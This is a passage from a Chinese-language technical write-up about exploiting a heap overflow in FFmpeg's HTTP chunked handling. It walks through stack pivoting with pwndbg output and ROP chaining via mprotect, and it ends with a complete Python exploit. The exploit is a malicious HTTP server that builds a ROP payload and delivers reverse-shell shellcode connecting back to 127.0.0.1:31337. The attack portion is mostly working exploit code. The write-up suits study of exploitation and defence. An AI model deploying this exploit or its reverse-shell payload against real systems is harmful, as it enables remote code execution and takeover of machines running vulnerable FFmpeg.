        }
        if (s->read_packet)
            len = s->read_packet(s->opaque, dst, len);
首先要把栈迁移到堆上，由于堆地址是随机的，我们不知道。所以只能利用当时寄存器或者内存中存在的堆指针，并且堆指针要指向我们可控的区域。在寄存器中没有找到合适的值，但是打印当前
stack, 可以看到栈上正好有我们需要的堆指针，指向 AVIOContext 结构体的开头。接下来只要想办法找到 pop rsp; ret 之类的 rop
就可以了。
    pwndbg> stack
    00:0000│rsp  0x7fffffffd8c0 —? 0x7fffffffd900 —? 0x7fffffffd930 —? 0x7fffffffd9d0 ?— ...
    01:0008│      0x7fffffffd8c8 —? 0x2b4ae00 —? 0x63e2c8 (ff_yadif_filter_line_10bit_ssse3+1928) ?— add    rsp, 0x58
    02:0010│      0x7fffffffd8d0 —? 0x7fffffffe200 ?— 0x6
    03:0018│      0x7fffffffd8d8 ?— 0x83d1d51e00000000
    04:0020│      0x7fffffffd8e0 ?— 0x8000
    05:0028│      0x7fffffffd8e8 —? 0x2b4b168 ?— 0x6868686868686868 ('hhhhhhhh')
    06:0030│rbp  0x7fffffffd8f0 —? 0x7fffffffd930 —? 0x7fffffffd9d0 —? 0x7fffffffda40 ?— ...
    07:0038│      0x7fffffffd8f8 —? 0x6cfb2c (avio_read+336) ?— movrax, qword ptr [rbp - 0x18]
把栈迁移之后，先利用 add rsp, 0x58; ret 这种蹦床把栈拔高，然后执行我们真正的 ROP 指令。由于 plt 表中有 mprotect,
所以可以先将 0x400000 地址处的 page 权限改为 rwx，再把 shellcode 写到那边去，然后跳转过去就行了。最终的堆布局如下：
放上最后利用成功的截图
启动恶意的 Server
客户端连接上 Server
成功反弹 shell
最后附上完整的利用脚本，根据漏洞作者的 exp 修改而来
    #!/usr/bin/python
    #coding=utf-8
    import re
    importos
    import sys
    import socket
    import threading
    from time import sleep
    frompwn import *
    bind_ip = '0.0.0.0'
    bind_port = 12345
    headers = """HTTP/1.1 200 OK
    Server: HTTPd/0.9
    Date: Sun, 10 Apr 2005 20:26:47 GMT
    Content-Type: %s
    Transfer-Encoding: chunked
    Set-Cookie: XXXXXXXXXXXXXXXX=AAAAAAAAAAAAAAAA;
    """ % ('h' * 3120)
    """
    """
    elf = ELF('/home/dddong/bin/ffmpeg_g')
    shellcode_location = 0x00400000
    page_size = 0x1000
    rwx_mode = 7
    gadget = lambda x: next(elf.search(asm(x, os='linux', arch='amd64')))
    pop_rdi = gadget('pop rdi; ret')
    pop_rsi = gadget('pop rsi; ret')
    pop_rax = gadget('pop rax; ret')
    pop_rcx = gadget('pop rcx; ret')
    pop_rdx = gadget('pop rdx; ret')
    pop_rbp = gadget('pop rbp; ret')
    leave_ret = gadget('leave; ret')
    pop_pop_rbp_jmp_rcx = gadget('pop rbx ; pop rbp ; jmprcx')
    push_rbx = gadget('push rbx; jmprdi')
    push_rsi = gadget('push rsi; jmprdi')
    push_rdx_call_rdi = gadget('push rdx; call rdi')
    pop_rsp = gadget('pop rsp; ret')
    add_rsp = gadget('add rsp, 0x58; ret')
    mov_gadget = gadget('mov qword ptr [rdi], rax ; ret')
    mprotect_func = elf.plt['mprotect']
    #read_func = elf.plt['read']
    def handle_request(client_socket):
        # 0x009e5641: mov qword [rcx], rax ; ret  ;  (1 found)
        # 0x010ccd95: push rbx ;jmprdi ;  (1 found)
        # 0x00d89257: pop rsp ; ret  ;  (1 found)
        # 0x0058dc48: add rsp, 0x58 ; ret  ;  (1 found)
        request = client_socket.recv(2048)
        payload = ''
        payload += 'C' * (0x8040)
        payload += 'CCCCCCCC' * 4
        ##################################################
        #rop starts here
        payload += p64(add_rsp) # 0x0: 从这里开始覆盖AVIOContext
        #payload += p64(0) + p64(1) + 'CCCCCCCC' * 2 #0x8:
        payload += 'CCCCCCCC' * 4 #0x8: buf_ptr和buf_end后面会被覆盖为正确的值
        payload += p64(pop_rsp) # 0x28: 这里是opaque指针，可以控制rdi和rcx, s->read_packet(opaque,dst,len)
        payload += p64(pop_pop_rbp_jmp_rcx) # 0x30: 这里是read_packet指针，call *%rax
        payload += 'BBBBBBBB' * 3 #0x38
        payload += 'AAAA' #0x50 must_flush
        payload += p32(0) #eof_reached
        payload += p32(1) + p32(0) #0x58 write_flag=1 and max_packet_size=0
        payload += p64(add_rsp) # 0x60: second add_esp_0x58 rop to jump to uncorrupted chunk
        payload += 'CCCCCCCC' #0x68: checksum_ptr控制rdi
        #payload += p64(push_rdx_call_rdi) #0x70
        payload += p64(1) #0x70: update_checksum
        payload += 'XXXXXXXX' * 9 #0x78: orig_buffer_size
        # realrop payload starts here
        #
        # usingmprotect to create executable area
        payload += p64(pop_rdi)
        payload += p64(shellcode_location)
        payload += p64(pop_rsi)
        payload += p64(page_size)
        payload += p64(pop_rdx)
        payload += p64(rwx_mode)
        payload += p64(mprotect_func)
        # backconnectshellcode x86_64: 127.0.0.1:31337
        shellcode = "\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\xc7\x44\x24\x04\x7f\x00\x00\x01\x48\x89\xe6\x6a\x10\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05";
        shellcode = '\x90' * (8 - (len(shellcode) % 8)) + shellcode
        shellslices = map(''.join, zip(*[iter(shellcode)]*8))
        write_location = shellcode_location
        forshellslice in shellslices:
            payload += p64(pop_rax)
            payload += shellslice
            payload += p64(pop_rdi)
            payload += p64(write_location)
            payload += p64(mov_gadget)
            write_location += 8
        payload += p64(pop_rbp)
        payload += p64(4)
        payload += p64(shellcode_location)
        client_socket.send(headers)
        client_socket.send('-1\n')
        #raw_input("sleep for a while to avoid HTTPContext buffer problem!")
        sleep(3)
        client_socket.send(payload)
        print "send payload done."
        client_socket.close()
    if __name__ == '__main__':
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((bind_ip, bind_port))
        s.listen(5)
        filename = os.path.basename(__file__)
        st = os.stat(filename)
        print 'start listening at %s:%s' % (bind_ip, bind_port)
        while True:
            client_socket, addr = s.accept()
            print 'accept client connect from %s:%s' % addr
            handle_request(client_socket)
            if os.stat(filename) != st:
                print 'restarted'
                sys.exit(0)
#### 5\. 反思与总结
这次的漏洞利用过程让我对 FFmpeg 的源代码有了更为深刻的理解。也学会了如何通过影响堆布局来简化漏洞利用的过程，如何栈迁移以及编写 ROP。
在 pwn 的过程中，阅读源码来搞清楚 malloc
的顺序，使用gdb插件（如libheap）来显示堆布局是非常重要的，只有这样才能对症下药，想明白如何才能调整堆的布局。如果能够有插件显示每一个 malloc
chunk 的函数调用栈就更好了，之后可以尝试一下 GEF 这个插件。
#### 6\. 参考资料
1   
2   
3   
4
官方修复链接：  
5   
6 Transfer-encoding介绍:  
7 漏洞原作者的 exp
:  
8 FFmpeg源代码结构图:  
9 
* * *